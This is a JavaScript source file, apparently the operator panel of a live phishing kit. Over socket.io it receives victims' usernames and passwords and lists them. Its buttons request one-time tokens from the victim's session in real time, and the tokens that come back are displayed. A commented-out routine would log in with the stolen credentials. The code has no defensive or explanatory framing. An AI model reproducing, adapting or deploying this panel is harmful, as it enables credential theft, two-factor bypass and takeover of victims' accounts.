const socket = io();

socket.on("connect", () => {
    console.log("El socket se ha conectado: ", socket.id);
    socket.emit("AdmOn", socket.id);
})

const panelData = document.querySelector("#panel-1");
socket.on("NewData", data => {
    var dataInfo = `<div class="row-data" id="parent-${data.socket}"> 
                        <div class="info-row" id="row-${data.socket}"> 
                            <p id="u-${data.socket}"> <b>User:</b> ${data.user} </p>
                            <p id="p-${data.socket}"> <b>Pass:</b> ${data.pass} </p>
                        </div>
                        <div class="buttons-row">
                            <!--<button class="iniciar-sesion" id="l-${data.socket}">Probar data</button>-->
                            <button class="pedir-token" id="t-${data.socket}" disabled>Pedir token</button>
                            <button class="finalizar" id="f-${data.socket}" disabled>Finalizar</button>
                            <button class="eliminar" id="d-${data.socket}">Eliminar</button>
                        </div>
                    </div>`
    panelData.innerHTML += dataInfo;
})

//Get Token
socket.on("ReSendToken", dataToken => {
    if(document.querySelector("#row-"+dataToken.Socket)){
        var parentData = document.querySelector("#row-"+dataToken.Socket);
        dataTokenInsert = `<p><b>Token:</b> ${dataToken.Token} </p>`;
        parentData.innerHTML += dataTokenInsert;

        //document.querySelector("#t-"+dataToken.Socket).remove();
    }
})

//Disconnect queue
socket.on("DisconnectQueue", baySocket => {
    if(document.querySelector("#row-"+baySocket.Id)){
        document.querySelector("#t-"+baySocket.Id).remove();
        document.querySelector("#f-"+baySocket.Id).remove();
    }
})

//Buttons panel
const on = (element, event, selector, handler) => {
    element.addEventListener(event, e => {
        if (e.target.closest(selector)) {
            handler(e)
        }
    })
}

/*on(document, 'click', '.iniciar-sesion', e =>{
    const id = e.target.id;
    idUser = id.substring(2);
    const user = document.querySelector("#u-"+idUser).textContent.substring(7);
    const pass = document.querySelector("#p-"+idUser).textContent.substring(7);
    userPass = [user, pass];
    socket.emit("IniciarSesion", userPass);
})*/


on(document, 'click', '.pedir-token', e =>{
    const id = e.target.id;
    idUser = id.substring(2);
    socket.emit("PedirToken", idUser);
    document.querySelector("#"+id).innerHTML = "Volver a pedir token"
})

on(document, 'click', '.finalizar', e =>{
    const id = e.target.id;
    idUser = id.substring(2);
    socket.emit("Finalizar", idUser);
    document.querySelector("#f-"+idUser).remove();
    document.querySelector("#t-"+idUser).remove();
})

on(document, 'click', '.eliminar', e =>{
    if(confirm('¿Deseas eliminar este registro?')){
        const id = e.target.id;
        idUser = id.substring(2);
        document.querySelector("#parent-"+idUser).remove();
    }
})

// RECARGAR LA PAGINA
window.onbeforeunload = function() {
    return "¿Desea recargar la página web?";
  };